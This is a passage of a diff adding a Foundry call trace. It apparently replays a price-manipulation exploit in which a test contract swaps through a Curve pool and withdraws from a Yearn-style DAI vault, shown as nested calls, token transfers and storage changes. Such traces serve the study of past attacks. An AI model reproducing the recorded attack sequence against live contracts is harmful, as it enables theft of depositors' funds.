+    │   │   │   ├─ [7209] yDAI::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 160000000000000000000000 [1.6e23])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 160000000000000000000000 [1.6e23])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640563829457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000b03040e4027dfe109a7e → 0x000000000000000000000000000000000000000000008e4ea2d766d2da109a7e
+    │   │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0xfffffffffffffffffffffffffffffffffffffffffffff5697e9c0f5a84bfffff → 0xffffffffffffffffffffffffffffffffffffffffffffd387e08f73af60bfffff
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x0000000000000000000000000000000000000000000013de6cd3be08bcd252c7 → 0x0000000000000000000000000000000000000000000035c00ae059b3e0d252c7
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [30848] yTUSD::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 94020924071307702862489 [9.402e22])
+    │   │   │   │   ├─ emit Transfer(from: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 94020924071307702862489 [9.402e22])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x000000000000000000000000000000000000000000001465e0e574dbae3bb6ea → 0x00000000000000000000000000000000000000000000007cfe766a3580e93451
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000013e8e26f0aa62d528299
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit TokenExchange(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0, param2: 160000000000000000000000 [1.6e23], param3: 3, param4: 94020924071307702862489 [9.402e22])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: 0x0000000000000000000000000000000000000000000013de6b110fe0146cd77d → 0x0000000000000000000000000000000000000000000035c0091dab8b386cd77c
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ad1: 0x000000000000000000000000000000000000000000001464e8460c12288eba2d → 0x00000000000000000000000000000000000000000000007b00c6634d517b40c4
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [952] yDAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 672026620565648890174078 [6.72e23]
+    │   │   ├─ [230974] CurveFiSwap::exchange(0, 2, 672026620565648890174078 [6.72e23], 0)
+    │   │   │   ├─ [35413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1014696242399124404845345 [1.014e24]
+    │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   ├─ [31906] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   ├─ [6496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   ├─ [29076] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   ├─ [803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   ├─ [31690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1185] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   ├─ [6496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
+    │   │   │   ├─ [7209] yDAI::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 672026620565648890174078 [6.72e23])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 672026620565648890174078 [6.72e23])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640563157430963442264239465857 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x0000000000000000000000000000000000000000000035c00ae059b3e0d252c7 → 0x00000000000000000000000000000000000000000000c40eadb7c086bae2ed45
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000000008e4ea2d766d2da109a7e → 0
+    │   │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0xffffffffffffffffffffffffffffffffffffffffffffd387e08f73af60bfffff → 0xffffffffffffffffffffffffffffffffffffffffffff45393db80cdc86af6581
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [30848] yUSDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4869389952115967126106 [4.869e21])
+    │   │   │   │   ├─ emit Transfer(from: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4869389952115967126106 [4.869e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x00000000000000000000000000000000000000000000010eb10369a7ba05519e → 0x000000000000000000000000000000000000000000000006b8a71f56e16f6744
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000000107f85c4a50d895ea5a
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit TokenExchange(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0, param2: 672026620565648890174078 [6.72e23], param3: 2, param4: 4869389952115967126106 [4.869e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ad0: 0x00000000000000000000000000000000000000000000010e87ef45737363bb0a → 0x000000000000000000000000000000000000000000000006820dafd3810c4630
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: 0x0000000000000000000000000000000000000000000035c0091dab8b386cd77c → 0x00000000000000000000000000000000000000000000c40eabf5125e127d71f8
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [602] DAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 39990000000000000000000 [3.999e22]
+    │   │   ├─ [23374] DAI::transfer(StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], 39990000000000000000000 [3.999e22])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: StrategyDAICurve: [0xaf274e912243b19B882f02d731dacd7CD13072D0], value: 39990000000000000000000 [3.999e22])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x8de997b573eff4ada52fc00c2e709fc60cb65fa0453d38e3a735756e383421fd: 0 → 0x000000000000000000000000000000000000000000000877dcbc03e63f180000
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x000000000000000000000000000000000000000000000877dcbc03e63f180000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [532] cDAI::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 1342703033514129291125012 [1.342e24]
+    │   │   ├─ [238135] cDAI::withdraw(1342703033514129291125012 [1.342e24], false)
+    │   │   │   ├─ [192377] 0x0b283B107F70d23250f882fbfe7216C38abBd7cA::balanceOf(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   ├─ [191466] StrategyDAICurve::balanceOf() [staticcall]
+    │   │   │   │   │   ├─ [179707] CurveFiSwap::get_virtual_price() [staticcall]
+    │   │   │   │   │   │   ├─ [35413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1014696242399124404845345 [1.014e24]
+    │   │   │   │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   │   │   │   ├─ [31906] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   │   ├─ [1315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   │   │   ├─ [6496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   │   │   │   ├─ [29076] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   │   │   │   ├─ [803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   │   │   │   ├─ [31690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   │   │   │   ├─ [1185] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   │   │   ├─ [6496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
